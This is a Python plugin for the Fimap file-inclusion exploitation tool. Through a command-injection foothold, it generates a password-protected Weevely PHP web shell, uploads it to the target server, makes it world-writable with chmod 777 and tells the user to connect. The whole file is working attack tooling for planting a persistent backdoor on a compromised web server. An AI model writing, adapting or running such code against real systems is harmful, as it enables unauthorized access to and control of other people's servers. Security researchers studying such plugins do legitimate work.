# Weevils Plugin for Fimap
# Does not work properly YET
# Well, it works fine. The issue is that it does not "create" the Weevely backdoor yet
# version: 1.0 Alpha
import os
from plugininterface import basePlugin
import inspect
import time

class weevils(basePlugin):

    def plugin_init(self):
        pass
        
    def plugin_loaded(self):
        pass

    def request_parameters(self):
        pass
        
     
    def plugin_exploit_modes_requested(self, langClass, isSystem, isUnix):
        # This method will be called just befor the user gets the 'available attack' screen.
        # You can see that we get the 
        #     * langClass (which represents the current language of the script)
        #     * A boolean value 'isSystem' which tells us if we can inject system commands.
        #     * And another boolean 'isUnix' which will be true if it's a unix-like system and false if it's Windows.
        # We should return a array which contains tuples with a label and a unique callback string.
        ret = []

        #print "Language: " + langClass.getName()
        
        if (isSystem):
            attack = ("Uploads a Weevily Backdoor", "weevils.weevils")
            ret.append(attack)
        
        return(ret)	
        
    def plugin_callback_handler(self, callbackstring, haxhelper):
        # This function will be launched if the user selected one of your attacks.
        # The two params you receive here are:
        #    * callbackstring - The string you have defined in plugin_exploit_modes_requested.
        #    * haxhelper - A little class which makes it very easy to send an injected command.
        
        if (callbackstring == "weevils.weevils"):
            
            if (haxhelper.isUnix()):
		weevely_path= "%s/weevely" % os.path.dirname(inspect.getfile(inspect.currentframe()))

		os.chdir(weevely_path)
		if not os.path.isfile("./shell.php"):
			print "Shell Not Generated Yet!"
			print "Generate a shell... password MUST be 6 chars or more!"
			password = raw_input("Input Password Please: ")
			time.sleep(5)
			if  os.system("python weevely.py generate %s shell.php" %(password)) != 0:
				print "Failed to Generate Shell"
				return 1

		self.request_parameters()
		rname="/%s/shell.php" % (haxhelper.executeSystemCommand(haxhelper.getPWDCommand()))

		print "Uploading shell to %s  ..." % rname
		bytes = haxhelper.uploadfile("./shell.php", rname, chunksize=1024)
		print "Uploaded %s bytes" % bytes
		haxhelper.executeSystemCommand("chmod 777 %s" % rname)
		print "Use Weevely to connect!"
